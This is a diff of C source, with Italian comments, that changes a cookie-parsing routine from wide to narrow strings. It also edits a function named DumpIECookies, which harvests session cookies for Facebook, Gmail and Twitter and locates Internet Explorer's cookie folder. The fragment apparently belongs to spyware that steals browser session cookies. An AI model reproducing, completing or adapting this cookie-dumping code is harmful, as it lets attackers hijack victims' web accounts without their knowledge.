@@ -77,30 +77,30 @@ WCHAR *GetIEProfilePath(WCHAR *cookie_path)
 }
 
 // Divide e parsa i singoli cookie all'interno di uno stringone
-void ParseSessionCookies(WCHAR *cookie_string, WCHAR *domain)
+void ParseSessionCookies(char *cookie_string, char *domain)
 {
-	WCHAR *ptr1, *ptr2, *ptr3;
+	char *ptr1, *ptr2, *ptr3;
 	
-	if (wcslen(cookie_string) == 0)
+	if (strlen(cookie_string) == 0)
 		return;
 
 	ptr1 = cookie_string;
 	do {
-		ptr2 = wcschr(ptr1, L';');
+		ptr2 = strchr(ptr1, ';');
 		if (ptr2) 
 			*ptr2 = NULL;
 	
-		ptr3 = wcschr(ptr1, L'=');
+		ptr3 = strchr(ptr1, '=');
 		if (ptr3) {
 			*ptr3 = NULL;
 			ptr3++;
-			AddCookieW(domain, ptr1, ptr3);
+			AddCookieA(domain, ptr1, ptr3);
 		}
 
 		ptr1 = ptr2;
 		if (ptr1) {
 			ptr1++;
-			if (*ptr1 == L' ')
+			if (*ptr1 == ' ')
 				ptr1++;
 		}
 	} while(ptr1);
@@ -113,9 +113,9 @@ int DumpIECookies(WCHAR *cookie_path)
 	WCHAR cookie_search[MAX_PATH];
 	HANDLE hFind;
 
-	ParseSessionCookies(FACEBOOK_IE_COOKIE, FACEBOOK_DOMAIN);
-	ParseSessionCookies(GMAIL_IE_COOKIE, GMAIL_DOMAIN);
-	ParseSessionCookies(TWITTER_IE_COOKIE, TWITTER_DOMAIN);
+	ParseSessionCookies(FACEBOOK_IE_COOKIE, FACEBOOK_DOMAINA);
+	ParseSessionCookies(GMAIL_IE_COOKIE, GMAIL_DOMAINA);
+	ParseSessionCookies(TWITTER_IE_COOKIE, TWITTER_DOMAINA);
 
 	ie_dir = GetIEProfilePath(cookie_path);
 	_snwprintf_s(cookie_search, MAX_PATH, L"%s\\*", ie_dir);  
